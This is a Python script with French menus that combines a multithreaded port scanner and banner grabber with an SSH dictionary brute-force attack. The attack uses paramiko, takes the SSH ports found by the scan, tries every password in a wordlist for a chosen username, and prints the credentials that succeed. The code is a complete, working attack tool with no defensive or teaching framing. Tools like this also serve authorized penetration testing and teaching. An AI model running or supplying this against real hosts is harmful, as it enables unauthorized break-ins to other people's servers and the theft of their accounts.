import socket
import threading
from queue import Queue
import os
import paramiko

# Timeout global
socket.setdefaulttimeout(1)

print_lock = threading.Lock()

# File de tâches
q = Queue()

# Résultats
results = []


def grab_banner(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))

            if port in [80, 443]:
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: %b\r\n\r\n" % ip.encode())

            banner = s.recv(1024).decode(errors='ignore').strip()
            if banner:
                fingerprint = ""
                if "SSH" in banner.upper():
                    fingerprint = " (Serveur SSH détecté)"
                elif "HTTP" in banner.upper():
                    fingerprint = " (Serveur Web détecté)"

                with print_lock:
                    line = f"[+] Port {port} ouvert – Service détecté : {banner}{fingerprint}"
                    print(line)
                    results.append(line)
    except:
        pass


def worker(ip):
    while not q.empty():
        port = q.get()
        grab_banner(ip, port)
        q.task_done()


def scan_mode():
    ip = input("Entrez l'adresse IP à scanner : ").strip()
    port_start = int(input("Port de début : ").strip())
    port_end = int(input("Port de fin : ").strip())

    for port in range(port_start, port_end + 1):
        q.put(port)

    threads = []
    for _ in range(100):
        t = threading.Thread(target=worker, args=(ip,))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    if results:
        with open("scan.txt", "w") as f:
            for line in results:
                f.write(line + "\n")
        print("\n[+] Résultats sauvegardés dans 'scan.txt'")
    else:
        print("\n[-] Aucun service détecté avec bannière")


def ssh_brute_force(ip, port, username, wordlist_path):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            try:
                ssh.connect(ip, port=port, username=username, password=password, timeout=3)
                print(f"[+] Succès ! {username}:{password}")
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                print(f"[-] Échec : {username}:{password}")
            except Exception as e:
                print(f"[!] Erreur : {e}")
    return False


def attack_mode():
    filepath = input("Entrez le chemin du fichier de scan (ex: scan.txt) : ").strip()
    if not os.path.isfile(filepath):
        print("[-] Fichier introuvable.")
        return

    ip = input("Entrez l'adresse IP cible : ").strip()
    username = input("Nom d'utilisateur à tester : ").strip()
    wordlist_path = input("Chemin vers le dictionnaire de mots de passe : ").strip()
    if not os.path.isfile(wordlist_path):
        print("[-] Fichier dictionnaire introuvable.")
        return

    print("\n[!] Début de l'attaque...")
    with open(filepath, 'r') as f:
        lines = f.readlines()
        for line in lines:
            if "SSH" in line.upper():
                try:
                    port = int(line.split()[1])
                except ValueError:
                    continue
                print(f"[*] Tentative de brute force sur SSH port {port} pour l'utilisateur '{username}'...")
                success = ssh_brute_force(ip, port, username, wordlist_path)
                if success:
                    print("[+] Attaque terminée avec succès.")
                    return
    print("[-] Aucun mot de passe valide trouvé.")


def main():
    while True:
        print("""
======== MENU PRINCIPAL ========
1. Scan d'une IP et enregistrement (scan.txt)
2. Attaque par dictionnaire (à partir de scan.txt)
3. Quitter
================================
        """)
        choix = input("Choix : ").strip()
        if choix == '1':
            scan_mode()
        elif choix == '2':
            attack_mode()
        elif choix == '3':
            print("Au revoir !")
            break
        else:
            print("[!] Choix invalide, réessayez.")


if __name__ == '__main__':
    main()